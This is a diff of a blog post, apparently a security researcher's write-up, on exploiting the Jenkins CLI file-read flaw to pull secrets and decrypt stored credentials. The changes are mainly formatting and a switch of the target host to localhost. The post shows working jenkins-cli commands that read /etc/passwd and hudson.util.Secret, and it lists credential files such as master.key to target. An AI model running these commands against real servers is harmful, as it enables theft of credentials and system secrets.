@@ -3,6 +3,7 @@ title: Chosen Plaintext Attack / The case of Jenkins and US export restrictions 
 date: 2024-07-02 13:33:37 +/-TTTT
 categories: [crypto]
 tags: [crypto,jenkins,hudson]     # TAG names should always be lowercase
+comments: true
 image:
   path: https://s2.ezgif.com/tmp/ezgif-2-f4dfe46c67.gif
   show_in_post: true
@@ -59,7 +60,7 @@ As unauthenticated users, we are limited to reading only the first three lines o
 
 It can also be executed directly using the `jenkins-cli.jar` file, which can be downloaded from the URL `http://target/jnlpJars/jenkins-cli.jar`. For example:
 ```bash
-java -jar jenkins-cli.jar -s http://sherif.com:9091 who-am-i '@/etc/passwd' 2>&1
+java -jar jenkins-cli.jar -s http://localhost:9091 who-am-i '@/etc/passwd' 2>&1
 
 ERROR: No argument is allowed: root:x:0:0:root:/root:/bin/bash
 java -jar jenkins-cli.jar who-am-i
@@ -75,11 +76,11 @@ Reports your credential and permissions.
 Given the limited lines we can access due to the authentication, we must identify files of interest that may partially assist us.
 
 #### The key files that can be tested include:
-- `/proc/self/environ`
-- `/proc/self/cmdline`
-- `${JENKINS_HOME}/credentials.xml` (Jenkins home can be found in `/proc/self/*`)
-- `${JENKINS_HOME}/secrets/master.key`
-- `${JENKINS_HOME}/secrets/initialAdminPassword`
+- `/proc/self/environ`{: .filepath}
+- `/proc/self/cmdline`{: .filepath}
+- `${JENKINS_HOME}/credentials.xml`{: .filepath} (Jenkins home can be found in `/proc/self/*`)
+- `${JENKINS_HOME}/secrets/master.key`{: .filepath}
+- `${JENKINS_HOME}/secrets/initialAdminPassword`{: .filepath}
 
 Even if an attacker can access all the aforementioned files, including the `master.key`, these assets alone would not be sufficient to decrypt the credentials.
 
@@ -97,7 +98,7 @@ TBD How Jenkins do encryption and Decryption
 In the context of binary data retrieval, the absence of `hudson.util.Secret` presents a significant challenge. Attempts to retrieve it using the exploit mentioned above will fail, accompanied by the following error:
 
 ```python
-http://sherif.com:9091 not reachable: 'utf-8' codec can't decode byte 0xc6 in position 10: invalid continuation byte
+http://localhost:9091 not reachable: 'utf-8' codec can't decode byte 0xc6 in position 10: invalid continuation byte
 ```
 
 This issue arises due to the presence of non-printable characters. However, modifying line 80 as follows resolves this:
@@ -112,7 +113,7 @@ This issue arises due to the presence of non-printable characters. However, modi
 A Wireshark analysis was conducted to examine the retrieval of binary files. Notably, the binary file begins after the byte sequence `643a20`, with a repetitive sequence of `EFBFBD` starting from the 4th byte.
 
 
-![wireshark-analysis](https://ahmedsherif.github.io/assets/img/posts/2/wireshark-dump.png)
+![wireshark-analysis](https://ahmedsherif.github.io/assets/img/posts/2/wireshark-dump.png){: .shadow }
 
 > This was only the case on the testing environment.
 {: .prompt-danger}
@@ -146,6 +147,7 @@ Upon examining the initial 16 bytes in my case, it was evident that the `EFBFBD`
 ![Jenkins-hex-hudson](https://ahmedsherif.github.io/assets/img/posts/2/Jenkins-hex-hudson.png)
 
 
+
 > The actual bytes of Hudson file starts after `3a20`. The first 32 bytes are output from Jenkins-cli itself and irrelevant.
 {: .prompt-tip }
 
@@ -155,6 +157,7 @@ In order to avoid confusion between the bytes of `Hudson` file itself and `jenki
 cat hudson.bin | tail -c +33 | head -c +16 | xxd
 ```
 ![hex-hudson-read-16bytes](https://ahmedsherif.github.io/assets/img/posts/2/Jenkins-reading-Hudson-16bytes.png)
+
 
 ### Byte patterns
 
@@ -172,6 +175,7 @@ dd if=hudson.bin bs=1 skip=32 count=16 2>/dev/null | xxd -p | fold -w2 | sort | 
 
 ![Hudson-Repeated-byte](https://ahmedsherif.github.io/assets/img/posts/2/Jenkins-repeated-byte.png)
 
+
 Of course, I was not sure if this approach will work or not but that was the next logical step for me. 
 
 ## Analyzing encrypted file, get IV and Ciphertext
@@ -188,7 +192,7 @@ Now it is time to place all together and automate the steps to crack the encrypt
 
 **Getting Hudson file** 
 ```bash
-java -jar jenkins-cli.jar -s http://sherif.com:9091 who-am-i '@/var/jenkins_home/secrets/hudson.util.Secret' 2>&1  | tail -c +33 | head -c 192 | xxd | tee hudson.bin
+java -jar jenkins-cli.jar -s http://localhost:9091 who-am-i '@/var/jenkins_home/secrets/hudson.util.Secret' 2>&1  | tail -c +33 | head -c 192 | xxd | tee hudson.bin
 ```
 **Sorting the master.key**
 
